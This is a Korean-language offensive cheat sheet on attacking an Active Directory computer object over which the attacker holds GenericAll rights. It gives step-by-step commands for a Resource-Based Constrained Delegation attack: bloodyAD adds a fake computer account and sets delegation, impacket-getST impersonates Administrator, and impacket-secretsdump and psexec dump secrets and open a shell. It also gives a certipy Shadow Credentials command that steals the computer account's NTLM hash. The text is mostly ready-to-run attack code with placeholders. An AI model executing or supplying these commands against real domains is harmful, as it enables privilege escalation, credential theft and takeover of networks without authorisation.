# 컴퓨터 대상

컴퓨터 오브젝트에 GenericAll이 있으면 RBCD 또는 Shadow Credentials 공격이 가능하다.

---

## RBCD (Resource-Based Constrained Delegation)

공격자가 제어하는 컴퓨터 계정이 타겟 컴퓨터를 대신해 Administrator를 사칭하는 방식이다. 도메인 유저에게 컴퓨터 계정 생성 권한이 있어야 하는데 기본값으로 허용된다.

```bash
# 1단계: 공격자 컴퓨터 계정 생성 (LDAP 389)
bloodyAD --host <DC_IP> -d <도메인> -u <공격자계정> -p '<패스워드>' \
  add computer 'FAKE01$' 'FakePass123!'

# 2단계: 타겟 컴퓨터에 RBCD 설정 (LDAP 389)
# msDS-AllowedToActOnBehalfOfOtherIdentity 속성 수정
bloodyAD --host <DC_IP> -d <도메인> -u <공격자계정> -p '<패스워드>' \
  add rbcd '<대상컴퓨터>$' 'FAKE01$'  # ← 수정

# 3단계: Administrator 사칭 TGS 발급 (Kerberos 88)
impacket-getST \
  -spn 'cifs/<대상컴퓨터>.<도메인>' \
  -impersonate Administrator \
  -dc-ip <DC_IP> \
  '<도메인>/FAKE01$:FakePass123!'  # ← 수정

# 4단계: TGS로 접근 (SMB 445)
export KRB5CCNAME=Administrator@cifs_<대상컴퓨터>.<도메인>@<도메인>.ccache
impacket-secretsdump -k -no-pass <도메인>/Administrator@<대상컴퓨터>.<도메인>
impacket-psexec -k -no-pass <도메인>/Administrator@<대상컴퓨터>.<도메인>
```

## Shadow Credentials

컴퓨터 계정의 NTLM 해시를 획득한다. 이후 Silver Ticket 또는 S4U2Self로 활용 가능하다. DC가 Windows Server 2016 이상이고 PKINIT을 지원해야 동작한다.

```bash
certipy shadow auto \
  -u <공격자계정>@<도메인> -p '<패스워드>' \
  -account '<대상컴퓨터>$' -dc-ip <DC_IP>  # ← 수정
# → 컴퓨터 계정 NTLM 해시 획득
```
